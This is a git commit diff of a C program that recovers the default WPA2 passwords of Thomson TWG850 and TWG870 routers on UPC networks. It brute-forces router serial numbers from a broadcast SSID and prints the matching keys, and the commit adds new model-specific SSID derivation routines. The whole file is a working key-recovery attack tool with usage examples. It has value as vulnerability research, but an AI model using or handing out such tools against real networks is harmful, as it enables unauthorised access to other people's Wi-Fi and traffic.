307146f8965ebdf03d0f32c4fab6a049bc9988d3
Joseph C. Lehner <joseph.c.lehner@gmail.com>
2016-05-10 19:19:34 +0200

    Support TWG870 UPC%07d networks

--- upc-twg850.c
+++ upc-twg850.c
@@ -1,5 +1,5 @@
 /**
- * WPA2 key-recovery for Thomson TWG850-4U UPC%06d networks
+ * WPA2 key-recovery for Thomson TWG8{5,7}0 UPC%0{6,7}d networks
  * Copyright (C) 2016 Joseph C. Lehner <joseph.c.lehner@gmail.com>
  *
  * Licensed under the GNU GPLv3.
@@ -19,16 +19,16 @@
  * and 2/3 channel 6. The channel number printed on the bottom
  * label is _not_ used!
  *
- * $ cc upc-twg850.c -o upc-twg850
+ * $ cc upc-twg8x0.c -o upc-twg8x0
  *
- * Print WPA2 key and SSID for serial number 00939-907201352
- * $ ./upc-twg850 00930907201352
+ * Print WPA2 key and SSID for a TWG850 serial number 00939-907201352
+ * $ ./upc-twg8x0 twg850 00930907201352
  *
  * Get serial numbers and WPA2 keys for SSID UPC009065
- * $ ./upc-twg850 UPC009065
+ * $ ./upc-twg8x0 twg850 UPC009065
  *
  * Same as above, but limit search to channel 6
- * $ ./upc-twg850 UPC009065 6
+ * $ ./upc-twg8x0 twg850 UPC009065 6
  */
 
 #include <string.h>
@@ -43,6 +43,12 @@ uint32_t sra(int32_t x, uint32_t n)
 	}
 
 	return x >> n;
+}
+
+uint32_t mult_mfhi(uint64_t a, uint64_t b)
+{
+	uint64_t r = a * b;
+	return (r & 0xffffffff00000000ull) >> 32;
 }
 
 uint32_t to_u32(char *s, size_t beg, size_t len)
@@ -103,12 +109,16 @@ void generate_upc_psk(uint32_t *sn, char *psk)
 	} while (++i < 8);
 }
 
-uint32_t generate_upc_ssid(uint32_t *sn)
+uint32_t generate_upc_ssid_twg850(uint32_t *sn)
 {
 	uint32_t ssid = (sn[2] << 3) + sn[2];
+	printf("ssid: %d", ssid);
 	ssid += (sn[3] << 10) - sn[3];
+	printf(" -> %d", ssid);
 	ssid += (sn[1] * sn[1]) + ((sn[0] << 1) + sn[0]);
+	printf(" -> %d", ssid);
 	ssid += 1 + ((sn[4] << 1) + sn[4]);
+	printf(" -> %d", ssid);
 
 	uint32_t v1 = ssid / 1000000;
 	uint32_t v0 = (((v1 << 5) - v1) << 9) + v1;
@@ -118,7 +128,179 @@ uint32_t generate_upc_ssid(uint32_t *sn)
 	return ssid;
 }
 
-uint32_t generate_upc_channel(uint32_t *sn)
+uint32_t generate_upc_ssid_tc7200(uint32_t *sn)
+{
+	uint32_t v0, v1, a0, a1, a2;
+	uint32_t s0 = 4;
+
+	v1 = sn[1];
+
+	if (s0 >= 4) {
+		v0 = v1 << 5;
+		v0 -= v1;
+
+		a0 = v0 << 6;
+		a0 -= v0;
+
+		a0 <<= 3;
+		a0 += v1;
+		v0 = a0 << 2;
+		a0 += v0;
+		a0 <<= 5;
+
+		v0 = sn[2];
+		v1 = v0 << 2;
+		v1 += v0;
+		v1 <<= 1;
+
+		v0 = sn[3];
+		v1 += v0;
+		v0 = v1 << 1;
+		v0 += v1;
+		v0 <<= 3;
+		v0 += v1;
+		v1 = v0 << 4;
+		v0 += v1;
+		v0 <<= 4;
+		a2 = a0 + v0;
+
+		v0 = sn[4];
+		a2 += v0;
+
+		v0 = 0xff8d8f20;
+	} else {
+		v0 = v1 << 5;
+		v0 -= v1;
+		a0 = v0 << 6;
+		a0 -= v0;
+		a0 <<= 3;
+		a0 += v1;
+		v0 = a0 << 2;
+		a0 += v0;
+		a0 <<= 5;
+
+		v0 = sn[2];
+		v1 = v0 << 2;
+		v1 += v0;
+		v1 <<= 1;
+
+		v0 = sn[3];
+		v1 += v0;
+		v0 = v1 << 1;
+		v0 += v1;
+		v0 <<= 3;
+		v0 += v1;
+		v1 = v0 << 4;
+		v0 += v1;
+		v0 <<= 4;
+		a2 = a0 + v0;
+
+		v0 = sn[4];
+		a2 += v0;
+
+		v0 = 0xffd9da60;
+
+	}
+
+	a2 += v0;
+
+	a0 = sra(mult_mfhi(a2, 0x6b5fca6b), 22);
+	v0 = sra(a2, 31);
+	a0 -= v0;
+	v1 = a0 << 5;
+	v1 -= a0;
+	v0 = v1 << 6;
+	v0 -= v1;
+	v0 <<= 3;
+	v0 += a0;
+	v1 = v0 << 2;
+	v0 += v1;
+	v0 <<= 7;
+	a2 -= v0;
+
+	return a2;
+}
+
+uint32_t generate_upc_ssid_twg870(uint32_t *sn)
+{
+	uint32_t v0, v1, a0, a1, a2, s0;
+	uint32_t s1 = 0;
+
+	if (!s1) {
+		v1 = sn[2];
+		v0 = v1 << 3;
+		s0 = v0 + v1;
+
+		v1 = sn[3];
+		v0 = v1 << 10;
+		v0 -= v1;
+		s0 += v0;
+
+		v0 = sn[0];
+		v1 = v0 << 3;
+		v1 += v0;
+		v1 <<= 2;
+		v1 += v0;
+
+		v0 = sn[1];
+		a0 = v0 * v0;
+		v0 = a0 + v1;
+		s0 += v0;
+
+		v1 = sn[4];
+		v0 = v1 << 1;
+		v0 += v1;
+		s0 += v0;
+		s0 += 1;
+	} else if (s1 == 1) {
+		a0 = sn[4];
+		v0 = a0 << 2;
+		s0 = v0 + a0;
+		//v0 = sra(mult_mfhi(a0, 0x2c0b02c1), 4);
+		v0 = a0 / 93;
+		v1 = sra(a0, 31);
+		v0 -= v1;
+		v1 = v0 << 1;
+		v1 += v0;
+		v0 = v1 << 5;
+		v0 -= v1;
+		a0 -= v0;
+		v0 = a0 * a0;
+		s0 += v0;
+
+		v0 = sn[2];
+		a1 = v0 << 3;
+		a1 -= v0;
+
+		v1 = sn[3];
+		v0 = v1 << 11;
+		v0 -= v1;
+		a1 += v0;
+
+		v1 = sn[0];
+		v0 = v1 << 1;
+		v0 += v1;
+		v0 <<= 4;
+		v0 -= v1;
+
+		v1 = sn[1];
+		a0 = v1 * v1;
+		a2 = a0 * v1;
+		a0 = a2 + v0;
+		a1 += a0;
+		s0 += a1;
+	}
+
+	//v0 = mult_mfhi(s0, 0xd6bf963f) >> 23;
+	v0 = s0 / 10000000;
+	a0 = v0 * 0x98967f;
+	s0 -= a0;
+	s0 += 1;
+
+	return s0;
+}
+
+uint32_t generate_upc_channel_twg850(uint32_t *sn)
 {
 	uint32_t v0, v1, a0 = sn[4];
 	v0 = a0 / 3;
@@ -135,7 +317,14 @@ uint32_t generate_upc_channel(uint32_t *sn)
 	return 1;
 }
 
-void print(uint32_t *sn, uint32_t ssid, uint32_t ch)
+static uint32_t (*generate_upc_ssid)(uint32_t *) = NULL;
+static uint32_t (*generate_upc_channel)(uint32_t *) = NULL;
+static const char *ssid_fmt = NULL;
+
+static uint32_t sn0_twg850[] = { 913, 926, 939, 0 };
+static uint32_t sn0_twg870[] = { 955, 0 };
+
+static void print(uint32_t *sn, uint32_t ssid, uint32_t ch)
 {
 	if (!ch) {
 		ch = generate_upc_channel(sn);
@@ -143,7 +332,7 @@ void print(uint32_t *sn, uint32_t ssid, uint32_t ch)
 
 	printf("%05d-%d%02d%d%05d  ", sn[0], sn[1], sn[2], sn[3], sn[4]);
 	printf("%-2d  ", ch);
-	printf("UPC%06d  ", ssid);
+	printf(ssid_fmt, ssid);
 
 	char psk[9];
 	generate_upc_psk(sn, psk);
@@ -152,10 +341,40 @@ void print(uint32_t *sn, uint32_t ssid, uint32_t ch)
 	printf("\n");
 }
 
+uint32_t mult(uint32_t a, uint32_t b, uint32_t c, uint32_t d, uint32_t e)
+{
+	uint32_t r = 1;
+	if (a) r *= a;
+	if (b) r *= b;
+	if (c) r *= c;
+	if (d) r *= d;
+	if (e) r *= e;
+
+	return r;
+}
+
 int main(int argc, char **argv)
 {
-	if (argc != 2 && argc != 3) {
-		fprintf(stderr, "usage: upc-twg850 <serial> | <ssid> [<channel>]\n");
+	if (argc != 3 && argc != 4) {
+		fprintf(stderr, "usage: upc-twg8x0 <device> <<serial> | <ssid> [<channel>]>\n");
+		return 1;
+	}
+
+	uint32_t *sn0 = NULL;
+
+	if (!strcmp(argv[1], "twg850")) {
+		ssid_fmt = "UPC%06d  ";
+		sn0 = sn0_twg850;
+		generate_upc_ssid = &generate_upc_ssid_twg850;
+		generate_upc_channel = &generate_upc_channel_twg850;
+	} else if (!strcmp(argv[1], "twg870")) {
+		ssid_fmt = "UPC%07d  ";
+		sn0 = sn0_twg870;
+		generate_upc_ssid = &generate_upc_ssid_twg870;
+		// FIXME
+		generate_upc_channel = &generate_upc_channel_twg850;
+	} else {
+		fprintf(stderr, "error: unknown device %s\n", argv[1]);
 		return 1;
 	}
 
@@ -163,15 +382,14 @@ int main(int argc, char **argv)
 	uint32_t ssid = 0;
 	uint32_t ch = 0;
 
-	if (sscanf(argv[1], "UPC%d", &ssid) == 1) {
+	if (sscanf(argv[2], "UPC%d", &ssid) == 1) {
 		if (argc == 3) {
 			ch = atoi(argv[2]);
 		}
 
 		unsigned i = 0;
-		uint32_t sn0[] = { 913, 926, 939 };
 
-		for (; i != sizeof(sn0) / sizeof(sn0[0]); ++i) {
+		for (; sn0[i]; ++i) {
 			sn[0] = sn0[i];
 
 			for (sn[1] = 0; sn[1] <= 9; ++sn[1])
@@ -189,8 +407,8 @@ int main(int argc, char **argv)
 				print(sn, ssid, ch);
 			}
 		}
-	} else if (strlen(argv[1]) == 14) {
-		split_sn(argv[1], sn);
+	} else if (strlen(argv[2]) == 14) {
+		split_sn(argv[2], sn);
 		ssid = generate_upc_ssid(sn);
 		print(sn, ssid, 0);
 	}
